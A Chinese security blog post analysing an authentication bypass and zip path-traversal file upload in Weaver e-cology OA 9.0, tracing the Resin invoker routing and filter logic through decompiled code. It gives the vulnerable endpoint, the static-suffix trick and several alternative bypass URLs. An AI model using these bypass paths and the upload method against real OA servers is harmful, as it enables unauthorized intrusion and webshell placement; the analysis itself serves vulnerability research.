<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>某微文件上传漏洞分析 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="某微文件上传漏洞分析"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 4.2.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>某微文件上传漏洞分析</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/05/27/某微文件上传漏洞分析/" rel="bookmark">
        <time class="entry-date published" datetime="2021-05-27T06:16:17.000Z">
          2021-05-27
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>​        漏洞分析的好处一方面可以加深漏洞的理解，说不定还能顺手再挖个。</p>
<a id="more"></a>

<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>​        直接使用某个老哥分享的泛微9.0的环境，之前自己搭建的8.0环境是没有这个漏洞的。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210527141801145.png" alt="image-20210527141801145"></p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>​        漏洞URL：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;weaver&#x2F;weaver.common.Ctrl&#x2F;.css?arg0&#x3D;com.cloudstore.api.service.Service_CheckApp&amp;arg1&#x3D;validateApp</span><br></pre></td></tr></table></figure>

<p>​        直接说结果吧，我在泛微9.0确实复现成功了，制作压缩包需要跨3层目录<code>../../../xxx.jsp</code>，执行成功后直接返回200，没有特殊的返回。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210527155529340.png" alt="image-20210527155529340"></p>
<p><code>/cloudstore/</code></p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210527155505851.png" alt="image-20210527155505851"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​        带着问题分析不容易跑偏吧。</p>
<h4 id="通过-css是用来绕过登录吗？"><a href="#通过-css是用来绕过登录吗？" class="headerlink" title="通过.css是用来绕过登录吗？"></a>通过.css是用来绕过登录吗？</h4><p>​        首先猜测这个.css是为了绕过权限认证，但经过测试即使我使用system登录访问这个接口仍然会是403。参考先知上<code>某OA接口绕过后任意文件上传分析</code>文章，知道拦截规则主要在<code>weaver.security.rules. .SecurityRuleQX20#validate</code>中，可以看到即使用户已经登录，还是会从配置文件resource_security.properties中获取isValidate属性，我在当前的环境中并没有这个文件，所以会给在<code>var3.getRule().put(&quot;resource_security&quot;, var6);</code>中给resource_security赋值为0并且<code>resource_security_init</code>赋值为true，对应到代码中var6的返回值会是0,<code>!&quot;true&quot;.equals(var3.null2String(var3.getRule().get(&quot;resource_security_init&quot;)))</code>会返回false，最终还是无法正常对<code>weaver/weaver.common.Ctrl/</code>接口正常请求的。所以<strong>通过.css不仅仅是绕过了登录的认证，更是绕过了接口访问黑名单的认证</strong>。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210528105819543.png" alt="image-20210528105819543"></p>
<p>​        顺便提一下，在泛微的手册里规定了安全日志默认在<code>ecology\WEB-INF\securitylog</code>目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2021-05-28 10:44:41:&gt;&gt;&gt;&gt;Xss(Validate failed[URL Acess Inject]) validateClass&#x3D;weaver.security.rules.SecurityRuleQX20  path&#x3D;&#x2F;weaver&#x2F;weaver.common.Ctrl&#x2F; security validate failed!  user:系统管理员  source ip:xxx</span><br><span class="line">2021-05-28 11:06:30:&gt;&gt;&gt;&gt;Xss(Validate failed[URL Acess Inject]) validateClass&#x3D;weaver.security.rules.   path&#x3D;&#x2F;weaver&#x2F;weaver.common.Ctrl&#x2F; security validate failed!  user:系统管理员  source ip:xxxxx</span><br></pre></td></tr></table></figure>

<p>​        我们在仔细看看if匹配的条件，当path中同时出现<code>weaver,common,ctrl</code>或<code>weaver,common,downloadservlet</code>才会被拦截，也就是说这个validate仅仅是拦截了<code>weaver.common.ctrl</code>和<code>weaver.common.downloadservlet</code>两个接口的访问。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path.indexOf(<span class="string">"weaver"</span>) != -<span class="number">1</span> &amp;&amp; path.indexOf(<span class="string">"common"</span>) != -<span class="number">1</span> &amp;&amp; (path.indexOf(<span class="string">"ctrl"</span>) != -<span class="number">1</span> || path.indexOf(<span class="string">"downloadservlet"</span>) != -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>​        通过上面的分析，要想绕过<code>weaver.security.rules.ruleImp.SecurityRuleQX20#validate</code>的拦截规则，只能是让系统执行不到这个方法。那么怎么才能只能不到这个方法，通过POC中的<code>.css</code>可以看出，<strong>当系统把我们请求的URL当作静态页面时，不会执行这个方法，可以通过打断点并访问来测试</strong>。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210528115825954.png" alt="image-20210528115825954"></p>
<p>​        经过测试当访问<code>weaver/weaver.common.Ctrl/11.js</code> ，<code>weaver/weaver.common.Ctrl/11.css</code>等url时，既可以不经过<code>weaver.security.rules.ruleImp.SecurityRuleQX20#validate</code>的验证，又可以调用到Ctrl的doGet方法。下面是调用栈</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">doGet:<span class="number">21</span>, Ctrl (weaver.common)</span><br><span class="line">service:<span class="number">120</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">97</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">doFilter:<span class="number">109</span>, ServletFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">129</span>, PFixFilter (weaver.filter)</span><br><span class="line">doFilter:<span class="number">89</span>, FilterFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">75</span>, DynamicMonitorXFilter (weaver.filter)</span><br><span class="line">doFilter:<span class="number">81</span>, MonitorXFilter (weaver.filter)</span><br><span class="line">doFilter:<span class="number">89</span>, FilterFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">47</span>, WStaticFilter (weaver.filter)</span><br><span class="line">doFilter:<span class="number">89</span>, FilterFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">193</span>, WGzipFilter (weaver.filter)</span><br><span class="line">doFilter:<span class="number">89</span>, FilterFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">79</span>, IECompatibleFilter (weaver.filter)</span><br><span class="line">doFilter:<span class="number">89</span>, FilterFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">21</span>, ECompatibleFilter (weaver.filter)</span><br><span class="line">doFilter:<span class="number">89</span>, FilterFilterChain (com.caucho.server.dispatch)</span><br><span class="line">process:<span class="number">312</span>, SecurityMain (weaver.security.filter)</span><br><span class="line">invoke:-<span class="number">1</span>, GeneratedMethodAccessor79 (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">doFilterInternal:<span class="number">51</span>, SecurityFilter (weaver.filter)</span><br><span class="line">doFilter:<span class="number">76</span>, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:<span class="number">89</span>, FilterFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">87</span>, EncodingFilter (weaver.security.filter)</span><br><span class="line">doFilter:<span class="number">89</span>, FilterFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">156</span>, WebAppFilterChain (com.caucho.server.webapp)</span><br><span class="line">doFilter:<span class="number">95</span>, AccessLogFilterChain (com.caucho.server.webapp)</span><br><span class="line">service:<span class="number">304</span>, ServletInvocation (com.caucho.server.dispatch)</span><br><span class="line">handleRequest:<span class="number">840</span>, HttpRequest (com.caucho.server.http)</span><br><span class="line">dispatchRequest:<span class="number">1367</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleRequest:<span class="number">1323</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleRequestsImpl:<span class="number">1307</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleRequests:<span class="number">1215</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleAcceptTaskImpl:<span class="number">1011</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">runThread:<span class="number">117</span>, ConnectionTask (com.caucho.network.listen)</span><br><span class="line">run:<span class="number">93</span>, ConnectionTask (com.caucho.network.listen)</span><br><span class="line">handleTasks:<span class="number">175</span>, SocketLinkThreadLauncher (com.caucho.network.listen)</span><br><span class="line">run:<span class="number">61</span>, TcpSocketAcceptThread (com.caucho.network.listen)</span><br><span class="line">runTasks:<span class="number">173</span>, ResinThread2 (com.caucho.env.thread2)</span><br><span class="line">run:<span class="number">118</span>, ResinThread2 (com.caucho.env.thread2)</span><br></pre></td></tr></table></figure>

<p>​        所以<strong>使用<code>.css,.js,.png,.jpg</code>等后缀能绕过的原因在于系统会根据文件后缀的不同调用不同的过滤器进行处理，一旦系统判断用户访问的是静态文件，处理上会放松很多</strong>。有好几个系统的权限绕过都是基于这种方式。使用静态后缀绕过检测是正常的，可是为什么还能正常将请求转发到servlet上进行处理呢？这需要我们先了解为什么请求可以路由到Ctrl类中。</p>
<h4 id="Ctrl的请求路由分析"><a href="#Ctrl的请求路由分析" class="headerlink" title="Ctrl的请求路由分析"></a>Ctrl的请求路由分析</h4><p>​        按照传统的审计思路，一定会在配置文件下定义一个<code>&lt;servlet&gt;</code>标签，并在其中定义如何从请求的URL映射到对应的某个处理类进行处理，但在这套系统中，我并没有找到<code>weaver.common.Ctrl</code>和某个URL之间的映射关系。在debug过程中，抓取所有的servletMapping,可以看到对于<code>/weaver/*</code>的匹配规则，是由resin.xml中定义的。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210528143220037.png" alt="image-20210528143220037"></p>
<p>​        在resin.xml中找到了对应的实现代码，<code>servlet-name=&#39;invoker&#39;</code>是resin内置的特殊servlet name,通过这个<code>servler-name</code>可以根据类名来转发到对应的servlet，可以通过这种方式调用classpath下的任意servlet。下面是resin的官方文档。</p>
<blockquote>
<p> In Resin, the special servlet-name ‘invoker’ is used to dispatch servlets by class name. Enabling the <em>invoker</em> servlet can create a security hole in your application. Any servlet in the classpath, perhaps even one in a .jar that you are unaware of, could be invoked.</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">id</span>=<span class="string">"/"</span> <span class="attr">root-directory</span>=<span class="string">"C:\ecology"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">servlet-mapping</span> <span class="attr">url-pattern</span>=<span class="string">'/weaver/*'</span> <span class="attr">servlet-name</span>=<span class="string">'invoker'</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">form-parameter-max</span>&gt;</span>100000<span class="tag">&lt;/<span class="name">form-parameter-max</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="为什么css可以绕过？"><a href="#为什么css可以绕过？" class="headerlink" title="为什么css可以绕过？"></a>为什么css可以绕过？</h4><p>​        对比绕过权限认证和被validate拦截情况下不同的调用链，可以注意到当程序执行到<code>weaver.security.filter.SecurityMain#process</code>方法，执行流程发生了改变，所以这个方法是我们分析绕过漏洞的重点。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210528150027089.png" alt="image-20210528150027089"></p>
<p>​        在<code>weaver.security.filter.SecurityMain#process</code>中发现如下代码,当匹配到请求路径的后缀以下面的后缀结尾时，会直接调用doFilter方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (path_lowerCase.endsWith(<span class="string">".cur"</span>) || path_lowerCase.endsWith(<span class="string">".ico"</span>) || path_lowerCase.endsWith(<span class="string">".css"</span>) || path_lowerCase.endsWith(<span class="string">".png"</span>) || path_lowerCase.endsWith(<span class="string">".jpg"</span>) || path_lowerCase.endsWith(<span class="string">".gif"</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!sc.null2String(sc.getRule().get(<span class="string">"OA-Server"</span>)).equals(<span class="string">""</span>)) &#123;</span><br><span class="line">        res.addHeader(<span class="string">"Server"</span>, sc.null2String(sc.getRule().get(<span class="string">"OA-Server"</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sc.addHeader(req, res);</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        我们看看在这个函数中，有没有其他在<code>executeCustomRules</code>之前调用的doFilter方法,找到了如下代码片段，想成功触发<code>doFilter</code>方法，需要满足如下两个条件</p>
<ul>
<li><code>skipAnyCheck</code>返回为<code>true</code></li>
<li><code>pathLowerCase</code>不包含<code>synccache.jsp</code></li>
</ul>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210528160259326.png" alt="image-20210528160259326"></p>
<p>​        首先找到<code>skipAnyCheck</code>的赋值语句<code>boolean skipAnyCheck = sc.isSkipAnyCheck(path);</code>，<code>isSkipAnyCheck</code>方法中主要判断请求的url中是否包含<code>skipFilterAnyCheckUrl</code>中指定的url。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isSkipAnyCheck</span><span class="params">(String var1)</span> </span>&#123;</span><br><span class="line">    Iterator var2 = skipFilterAnyCheckUrl.iterator();</span><br><span class="line">    String var3;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!var2.hasNext()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var3 = (String)var2.next();</span><br><span class="line">    &#125; <span class="keyword">while</span>(var1.toLowerCase().indexOf(var3) == -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​            <code>skipFilterAnyCheckUrl</code>主要是通过将配置文件中的<code>skip-any-check-list</code>元素取出并赋值。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210528162211478.png" alt="image-20210528162211478"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">skip-any-check-list</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url</span>&gt;</span>/weaver/weaver.org.layout.DownloadDeptLayoutServlet<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url</span>&gt;</span>/classbean/weaver/workflow/layout/WorkflowEditor.class<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url</span>&gt;</span>/login/LoginSSO.jsp<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url</span>&gt;</span>/login/LoginSSO2.jsp<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url</span>&gt;</span>synccache.jsp<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url</span>&gt;</span>/classbean/weaver/org/layout/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url</span>&gt;</span>/security/error500.jsp<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url</span>&gt;</span>/security/error404.jsp<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url</span>&gt;</span>/security/page/errorPage.jsp<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">skip-any-check-list</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        所以使用下面的URL同样可以达到绕过的目的。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/weaver/weaver.common.Ctrl/security/error404.jsp</span><br><span class="line">/weaver/weaver.common.Ctrl/security/error500.jsp</span><br><span class="line">/weaver/weaver.common.Ctrl/classbean/weaver/org/layout/</span><br><span class="line">/weaver/weaver.common.Ctrl/weaver/weaver.org.layout.DownloadDeptLayoutServlet</span><br><span class="line">/weaver/weaver.common.Ctrl/login/LoginSSO.jsp</span><br><span class="line">/weaver/weaver.common.Ctrl/login/LoginSSO2.jsp</span><br></pre></td></tr></table></figure>

<h4 id="重点：为什么绕过后还可以正常请求？"><a href="#重点：为什么绕过后还可以正常请求？" class="headerlink" title="重点：为什么绕过后还可以正常请求？"></a>重点：为什么绕过后还可以正常请求？</h4><p>​        其实仔细想想这个漏洞的根本原因在于resin Invoker调用处理的问题。即使后面加上了任意内容，仍然能调用到对应的处理类。所以<strong>理解这个漏洞的关键在于了解resin Invoker的处理逻辑</strong>。下面我搭了个测试环境验证。</p>
<p>​        经过调试发现，在<code>com.caucho.server.dispatch.ServletMapper#mapServlet</code>中，首先根据URL的匹配得到<code>ServletMapping</code>对象。再通过<code>servletMap.getServletName();</code>获取<code>servletName</code>。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531111910437.png" alt="image-20210531111910437"></p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531112037171.png" alt="image-20210531112037171"></p>
<p>​        判断servletName是否为invoker,并调用了<code>this.handleInvoker(invocation);</code>进行处理。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531112525449.png" alt="image-20210531112525449"></p>
<p>​        <code>invocation</code>里<code>_pathInfo</code>属性对后面的分析比较重要，下面分析下<code>_pathInfo</code>属性是如何得到赋值的。</p>
<p>​        在<code>/com/caucho/server/dispatch/ServletMapper.class:212</code>,会从<code>vars</code>得到servletPath，并判断<code>servletPath</code>是否小于<code>contextURI</code> 长度，如果满足条件，将从contextURI中截取<code>servletPath</code>后的内容赋给<code>_pathinfo</code>。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531114715707.png" alt="image-20210531114715707"></p>
<p>​        下面分析<code>vars</code>是如何赋值的，<code>com/caucho/server/dispatch/ServletMapper.class:196</code>判断servletName是否为空，为空会给<code>vars</code>添加内容，因此在本次请求中<code>vars</code>为空。<code>servletPath</code>的值是从<code>vars</code>中获取的，因此<code>servletPath</code>为空，<code>_pathInfo</code>的值为<code>contextURI</code>。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531115356037.png" alt="image-20210531115356037"></p>
<p>​        分析<code>com.caucho.server.dispatch.ServletMapper#handleInvoker</code>方法，根据<code>_pathInfo</code>得到servletName，并通过<code>this.addServlet(servletName);</code>添加servlet。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531120252747.png" alt="image-20210531120252747"></p>
<p>​            <code>com.caucho.server.dispatch.ServletMapper#addServlet</code>通过servletName从_servletManager获取servlet，获取不到则创建一个ServletConfigImpl对象，并添加到servletManager中。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531121109737.png" alt="image-20210531121109737"></p>
<p>​        重点关注<code>config.setServletClass(servletName);</code>方法，获取线程上下文加载器，通过<code>Class.forName</code>获取HelloWorld的Class对象并赋值给 _servletClass。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531133057639.png" alt="image-20210531133057639"></p>
<p>​        总的来说，<strong>Invoker会根据传入的URL动态创建一个servlet并添加到servletManager中</strong>。</p>
<p>​        下面分析为什么传入<code>/HelloWorld/xxxxx</code>这种形式的URL仍然能正常映射到HelloWorld处理类。在<code>com.caucho.server.dispatch.ServletMapper#handleInvoker</code>中，当请求的URL中包含<code>/</code>是，只会取出<code>/</code>之前的内容作为servletName，因此可以正常映射。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531135954007.png" alt="image-20210531135954007"></p>
<h4 id="漏洞最后的触发点在那？"><a href="#漏洞最后的触发点在那？" class="headerlink" title="漏洞最后的触发点在那？"></a>漏洞最后的触发点在那？</h4><p>​        通过前面的分析，已经了解了如何绕过并请求到Ctrl类，那么Ctrl中究竟做了什么操作，导致可以任意文件上传的。<code>weaver.common.Ctrl#doPost</code>代码如下，接收arg0和arg1的值和<code>HttpServletRequest</code>和<code>HttpServletResponse</code>对象的值，并调用了<code>StringUtil.doInvoke(var3, var4, var5)</code>。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531141719727.png" alt="image-20210531141719727"></p>
<p>​        首先看看vString方法做了什么，如果var0为空则返回var1,否则返回var0。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531142057582.png" alt="image-20210531142057582"></p>
<p>​        在<code>weaver.common.StringUtil#doInvoke(java.lang.String, java.lang.String, java.util.List&lt;java.lang.Object&gt;)</code>将var0当作类名，var1当作方法名，var2当作传入的参数进行反射调用。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531144553081.png" alt="image-20210531144553081"></p>
<p>​        根据传入的参数调用到<code>com.cloudstore.api.service.Service_CheckApp#validateApp</code>方法。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531145558569.png" alt="image-20210531145558569"></p>
<p>​        分析的重点主要在createLocalApp和decompress,首先看<code>com.cloudstore.api.service.Service_CheckApp#createLocalApp</code>获取请求的数据流，将请求的内容写入到app.zip中。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531145818816.png" alt="image-20210531145818816"></p>
<p>​        在<code>com.cloudstore.api.service.Service_CheckApp#decompress</code>中解压app.zip中的内容，并进行文件写入，造成任意文件上传。</p>
<p><img src="/2021/05/27/%E6%9F%90%E5%BE%AE%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20210531161529793.png" alt="image-20210531161529793"></p>
<h4 id="官方怎么修复的？"><a href="#官方怎么修复的？" class="headerlink" title="官方怎么修复的？"></a>官方怎么修复的？</h4><p>​        拿不到补丁，哭</p>
<h4 id="能否基于这个思路再去挖其他漏洞？"><a href="#能否基于这个思路再去挖其他漏洞？" class="headerlink" title="能否基于这个思路再去挖其他漏洞？"></a>能否基于这个思路再去挖其他漏洞？</h4><p>​        通过上面的分析，Ctrl并不是最终漏洞的触发点，只是用来调用<code>com.cloudstore.api.service.Service_CheckApp#createLocalApp</code>的中转，有没有类似的方法可以实现和Ctrl类相同的功能，在分析.css绕过时，发现不仅仅禁用了Ctrl类的访问，也禁用了downloadservlet的访问，那downloadservlet是否可以实现相同的转发功能。可以看到和Ctrl类的功能完全相同。</p>
